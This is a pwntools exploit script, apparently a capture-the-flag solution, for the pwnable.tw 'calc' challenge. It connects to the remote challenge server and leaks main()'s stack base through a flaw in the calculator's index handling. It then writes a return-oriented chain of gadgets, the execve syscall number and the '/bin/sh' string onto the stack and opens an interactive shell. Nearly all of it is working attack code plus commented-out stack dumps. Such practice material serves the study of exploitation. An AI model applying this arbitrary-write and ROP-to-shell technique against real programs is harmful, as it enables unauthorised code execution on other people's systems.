from pwn import *
from struct import pack, unpack
context(arch='i386')
# conn=process("./calc")
conn=remote("chall.pwnable.tw",10100)
# gdb.attach(conn)
conn.recv(timeout=5)
addr_ebp=0x59c/4+1
addr_canary=addr_ebp-0xc/4
conn.sendline('+'+str(addr_ebp))
ebp_main=conn.recvline()
ebp_main=int(ebp_main)
print "The ebp of main() is "+hex((1<<32)+ebp_main)
# conn.sendline('+'+str(addr_canary))
# canary=conn.recvline()
# canary=int(canary)
# if(canary<0):
# 	canary=0x100000000+int(canary)
# print "The canary of calc() is "+hex(canary)

# gadget=""
gadget1=[0x0805c34b,11,0x080701aa,0x080701d1,0x080701d1]#,0,0x080701d1,0,0]#,0x08049a21,0x6e69622f,0x0068732f]
for i in range(5):
	if(i==4):
		conn.sendline("+"+str(360+i)+"-"+str(gadget1[i]))
		conn.sendline("+364")
	else:
		conn.sendline("+"+str(360+i)+"-"+str(gadget1[i])+"%")
		conn.recv()
		# conn.sendline("+"+str(361+i))
	# print conn.recv()
# conn.recv(timeout=5)
"""
0x0805c34b
11
0x080701aa
0
0x080701d1
"""
# conn.sendline("")
# lst=[]
# for i in range(12):
# 	conn.sendline("+"+str(360+i))
# 	lst.append(int(conn.recv()))
# print "========================================================"
# print "========================================================"
# print "========================================================"
# for i in lst :
# 	if(i<0):
# 		print hex((1<<32)+i)
# 	else:
# 		print hex(i)


################################################################


for i in range(5,8):
	if(i==5):
		conn.sendline("+"+str(360+i)+"-"+str(1)+"%")
	else:
		conn.sendline("+"+str(360+i)+"-"+str(1))
# conn.recv(timeout=100)

# lst=[]
# for i in range(12):
# 	conn.sendline("+"+str(360+i))
# 	lst.append(int(conn.recv()))
# print "========================================================"
# print "========================================================"
# print "========================================================"
# for i in lst :
# 	if(i<0):
# 		print hex((1<<32)+i)
# 	else:
# 		print hex(i)
"""
0x805c34b
0xb
0x80701aa
0x0
0x80701d1
0x0
0x0 <- /bin/sh addr
0x1 

"""
ebp_main1=(1<<32)+ebp_main
v=abs(ebp_main)-4
conn.sendline("+"+str(360+7)+"-"+str(v))
conn.recv()
conn.sendline("+"+str(360+7))
print '++++++++++++++++++++++++'
print "The ebp of main() is "+hex(ebp_main1)

addr=conn.recv(timeout=5)
print hex((1<<32)+int(addr))

# conn.recv(timeout=5)
# lst=[]
# for i in range(12):
# 	conn.sendline("+"+str(360+i))
# 	lst.append(int(conn.recv()))
# print "========================================================"
# print "========================================================"
# print "========================================================"
# for i in lst :
# 	if(i<0):
# 		print hex((1<<32)+i)
# 	else:
# 		print hex(i)

"""
0xffffd078
0x805c34b
0xb
0x80701aa
0x0
0x80701d1
0x0
0xffffd07c

"""
gadget=[0x08049a21,0x6e69622f,0x0068732f]
for i in range(7,10):
	conn.sendline("+"+str(360+i)+"-"+str(gadget[i-7])+"%")
	conn.recv(timeout=5)
# conn.recv(timeout=5)

# lst=[]
# for i in range(12):
# 	conn.sendline("+"+str(360+i))
# 	lst.append(int(conn.recv()))
# print "========================================================"
# print "========================================================"
# print "========================================================"
# for i in lst :
# 	if(i<0):
# 		print hex((1<<32)+i)
# 	else:
# 		print hex(i)
conn.sendline("a")

conn.interactive()
#calc ebp=0xffffd058